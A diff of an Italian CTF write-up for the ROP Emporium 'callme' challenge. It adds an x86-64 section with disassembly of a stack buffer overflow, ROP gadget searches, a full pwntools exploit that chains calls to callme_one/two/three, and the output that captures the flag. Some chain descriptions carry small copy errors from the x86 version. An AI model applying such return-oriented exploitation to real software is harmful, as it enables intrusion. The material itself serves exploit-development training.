@@ -1,12 +1,18 @@
 # callme
 
+Link: [https://ropemporium.com/challenge/callme.html](https://ropemporium.com/challenge/callme.html)
+
+Report dello svolgimento della **challenge 3** di ROP Emporium per le architetture *x86* e *x86-64*.
+
+### x86
 - [Binary Analysis - x86](#binary-analysis---x86)
 - [Manual Exploit - x86](#manual-exploitation---x86)
 - [Capture the flag - x86](#capture-the-flag---x86)
 
-Di seguito lo svolgimento della **challenge 3** di ROP Emporium per le architetture *x86* e *x86-64*.
-
-Link: [https://ropemporium.com/challenge/callme.html](https://ropemporium.com/challenge/callme.html)
+### x86-64
+- [Binary Analysis - x86-64](#binary-analysis---x86-64)
+- [Manual Exploit - x86-64](#manual-exploitation---x86-64)
+- [Capture the flag - x86-64](#capture-the-flag---x86-64)
 
 ## Binary Analysis - x86
 
@@ -406,8 +412,8 @@ sym.imp.callme_three   sym.imp.callme_one     sym.imp.callme_two
 Adesso si solleva una nuova questione:
 
 - **padding** di dimensione 0x28 + 0x4 bytes.	
-- **callme_one**					<= saved eip di pwn_me
-- **callme_two**					<= saved eip di callme_one
+- **callme_one**					<--- saved eip di pwn_me
+- **callme_two**					<--- saved eip di callme_one
 - **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d
 
 Come invocare **callme_three**?
@@ -430,15 +436,20 @@ $ ropper --file=callme32 --search pop
 Questo sembra fare al caso nostro, l'idea quella di costruire una *rop chain* dalla forma seguente:
 
 - **padding** di dimensione 0x28 + 0x4 bytes.
-- **callme_one**                                            <= saved eip di pwn_me
-- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        <= saved eip di callme_one
+
+---
+- **callme_one**                                            `<--- saved eip di pwn_me`
+- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        `<--- saved eip di callme_one`
 - **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d
-- **callme_two**                                            <= saved eip di callme_one
-- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        <= saved eip di callme_two
+---
+- **callme_two**                                            `<--- saved eip di callme_one`
+- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        `<--- saved eip di callme_two`
 - **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d
-- **callme_three**                                          <= saved eip di callme_two
-- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        <= saved eip di callme_three
+---
+- **callme_three**                                          `<--- saved eip di callme_two`
+- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        `<--- saved eip di callme_three`
 - **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d
+---
 - **exit**
 - **status code**: 0x0
 
@@ -546,5 +557,283 @@ $ python3 exploit.py
 ```
 
 Eureka!
+
+Si prosegue con la risoluzione per *x86-64*.
+
+## Binary Analysis - x86-64 
+
+```bash
+$ file callme 
+callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
+
+$ file libcallme.so 
+libcallme.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=be0ff85ee2d8ff280e7bc612bb2a2709737e8881, not stripped
+
+$ checksec --file=callme
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    RUNPATH:    b'.'
+    Stripped:   No
+```
+
+Anche in questo caso e' presente una **buffer overflow vulnerability** nella funzione *pwnme*:
+
+```text
+┌ 90: sym.pwnme ();
+│ afv: vars(1:sp[0x28..0x28])
+│           0x00400898      55             push rbp
+│           0x00400899      4889e5         mov rbp, rsp
+│           0x0040089c      4883ec20       sub rsp, 0x20
+│           0x004008a0      488d45e0       lea rax, [buf]
+│           0x004008a4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
+│           0x004008a9      be00000000     mov esi, 0                  ; int c
+│           0x004008ae      4889c7         mov rdi, rax                ; void *s
+│           0x004008b1      e84afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
+│           0x004008b6      bff0094000     mov edi, str.Hope_you_read_the_instructions..._n ; 0x4009f0 ; "Hope you read the instructions...\n" ; const char *s
+│           0x004008bb      e810feffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004008c0      bf130a4000     mov edi, 0x400a13           ; '\x13\n@' ; "> " ; const char *format
+│           0x004008c5      b800000000     mov eax, 0
+│           0x004008ca      e811feffff     call sym.imp.printf         ; int printf(const char *format)
+│           0x004008cf      488d45e0       lea rax, [buf]
+│           0x004008d3      ba00020000     mov edx, 0x200              ; 512 ; size_t nbyte
+│           0x004008d8      4889c6         mov rsi, rax                ; void *buf
+│           0x004008db      bf00000000     mov edi, 0                  ; int fildes
+│           0x004008e0      e82bfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
+│           0x004008e5      bf160a4000     mov edi, str.Thank_you_     ; 0x400a16 ; "Thank you!" ; const char *s
+│           0x004008ea      e8e1fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x004008ef      90             nop
+│           0x004008f0      c9             leave
+└           0x004008f1      c3             ret
+[0x00400898]> afv
+var void * buf @ rbp-0x20
+
+```
+
+Verifichiamo:
+
+```bash
+$ # Filling the buffer
+$ python3 -c 'print("A"*0x20)' | ./callme 
+callme by ROP Emporium
+x86_64
+
+Hope you read the instructions...
+
+> Thank you!
+
+Exiting
+
+$ # Corrupting the saved rip 
+$ python3 -c 'print("A"*0x20 + "B"*0x8 + "C"*0x8)' | ./callme 
+callme by ROP Emporium
+x86_64
+
+Hope you read the instructions...
+
+> Thank you!
+Segmentation fault (core dumped)
+
+$ sudo dmesg
+[ 1657.437456] traps: callme[3644] general protection fault ip:4008f1 sp:7ffcbba70558 error:0 in callme[400000+1000]
+
+```
+
+## Manual Exploitation - x86-64
+
+Come per la versione *x86*, anche in questo caso deve essere costruita una *rop chain* per invocare:
+
+- **callme_one**: 0x00400720 
+- **callme_two**: 0x00400740
+- **callme_three**: 0x004006f0
+
+> Sempre utilizzando la *plt*.
+
+I parametri da passare alle funzioni sono i seguenti:
+
+- **param1**: 0xdeadbeefdeadbeef
+- **param2**: 0xcafebabecafebabe
+- **param3**: 0xd00df00dd00df00d
+
+Sapendo che la *convenzione di chiamata a funzioni in x86-64* prevede il passaggio dei parametri alla funzione tramite i registri **RDI**, **RSI** ed **RDX**, si definisce la seguente *rop chain*:
+
+- **padding** di dimensione 0x20 + 0x4 bytes.
+---
+- **pop_params_ret**: pop esi; pop edi; pop ebp; ret         <--- saved rip di pwn_me`
+- **param1**, **param2**, **param3**
+- **callme_one**
+---
+- **pop_params_ret**: pop rdi; pop rsi; pop rdx; ret;         <--- saved rip di callme_one`
+- **param1**, **param2**, **param3**
+- **callme_two**
+---
+- **pop_params_ret**: pop rdi; pop rsi; pop rdx; ret;         <--- saved rip di callme_two`
+- **param1**, **param2**, **param3**
+- **callme_three**
+---
+- **pop_rdi_ret**: pop rdi; ret				      <--- saved rip di callme_three
+- **param**: 0
+- **exit** 
+
+Si usa **ropper** per individaure i *gadget* utili per costruire la catena:
+
+```bash
+$ ropper --file=callme --search pop
+...
+0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
+0x00000000004009a3: pop rdi; ret; 
+...
+```
+
+### Capture The Flag - x86-64
+
+Di seguito il file per l'*exploit*:
+
+```python
+from pwn import *
+
+exe = './callme'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+gdbinit="""
+init-pwndbg
+# @pwnme: ret
+break* 0x004008f1
+# @callme_one
+break* 0x00400720
+# @callme_two
+break* 0x00400740
+# @callme_three
+break* 0x004006f0
+continue
+"""
+
+### Crafting the ROP chain ###
+
+param1=0xdeadbeefdeadbeef
+param2=0xcafebabecafebabe
+param3=0xd00df00dd00df00d
+
+"""
+===========================================
+ROP chain:
+============================================
+pop rdi; pop rsi; pop rdx; ret;
+params
+callme_one
+--------------------------------------------
+pop rdi; pop rsi; pop rdx; ret;
+paramas
+callme_two
+-------------------------------------------
+pop rdi; pop rsi; pop rdx; ret;
+params
+callme_three
+-------------------------------------------
+pop rdi; ret
+0
+exit
+"""
+
+# @plt
+callme_one=0x400720
+callme_two=0x400740
+callme_three=0x4006f0
+
+# @usefulFunction: call exit
+call_exit=0x400937
+
+# $ ropper --file=callme --search pop
+pop_params_ret=0x40093c
+pop_rdi_ret=0x4009a3
+
+# $ ropper --file=callme --search ret
+ret=0x4006be
+
+padding='A'*0x28
+
+payload=flat([
+    padding.encode(), 
+    ret,            # stack aligment
+    pop_params_ret,
+    param1, param2, param3,
+    callme_one,
+    pop_params_ret,
+    param1, param2, param3,
+    callme_two,    
+    pop_params_ret,
+    param1, param2, param3,
+    callme_three,
+    pop_rdi_ret,
+    0x0,
+    call_exit
+    ])
+
+### Send the payload ###
+
+io=process([exe])
+#io=gdb.debug([exe],gdbscript=gdbinit)
+io.sendline(payload)
+io.recvall()
+io.close()
+
+```
+
+Con una prima esecuzione, si e' sollevato un errore che e' stato approfondito con l'utilizzo del debugger **GDB**.
+
+```bash
+
+ ► 0x771e376a44c0 <_int_malloc+2832>    movaps xmmword ptr [rsp + 0x10], xmm1     <[0x7ffc20fdfb58] not aligned to 16 bytes>
+
+```
+
+L'errore e' causato dal **non allineamento dello stack**, e puo' essere risolto inserendo un *gadget* *ret* nel nostro payload.
+
+```bash
+$ ropper --file=callme --search ret
+0x00000000004006be: ret; 
+```
+
+[Leggi qui: https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment)
+
+Risultato dell'esecuzione:
+
+```bash
+$ python3 exploit.py 
+[+] Starting local process './callme': pid 5888
+[DEBUG] Sent 0xc1 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+    *
+    00000020  41 41 41 41  41 41 41 41  be 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
+    00000030  3c 09 40 00  00 00 00 00  ef be ad de  ef be ad de  │<·@·│····│····│····│
+    00000040  be ba fe ca  be ba fe ca  0d f0 0d d0  0d f0 0d d0  │····│····│····│····│
+    00000050  20 07 40 00  00 00 00 00  3c 09 40 00  00 00 00 00  │ ·@·│····│<·@·│····│
+    00000060  ef be ad de  ef be ad de  be ba fe ca  be ba fe ca  │····│····│····│····│
+    00000070  0d f0 0d d0  0d f0 0d d0  40 07 40 00  00 00 00 00  │····│····│@·@·│····│
+    00000080  3c 09 40 00  00 00 00 00  ef be ad de  ef be ad de  │<·@·│····│····│····│
+    00000090  be ba fe ca  be ba fe ca  0d f0 0d d0  0d f0 0d d0  │····│····│····│····│
+    000000a0  f0 06 40 00  00 00 00 00  a3 09 40 00  00 00 00 00  │··@·│····│··@·│····│
+    000000b0  00 00 00 00  00 00 00 00  37 09 40 00  00 00 00 00  │····│····│7·@·│····│
+    000000c0  0a                                                  │·│
+    000000c1
+[+] Receiving all data: Done (172B)
+[DEBUG] Received 0x6d bytes:
+    b'callme by ROP Emporium\n'
+    b'x86_64\n'
+    b'\n'
+    b'Hope you read the instructions...\n'
+    b'\n'
+    b'> Thank you!\n'
+    b'callme_one() called correctly\n'
+[*] Process './callme' stopped with exit code 0 (pid 5888)
+[DEBUG] Received 0x3f bytes:
+    b'callme_two() called correctly\n'
+    b'ROPE{a_placeholder_32byte_flag!}\n'
+
+```
+GG!
 
 ---
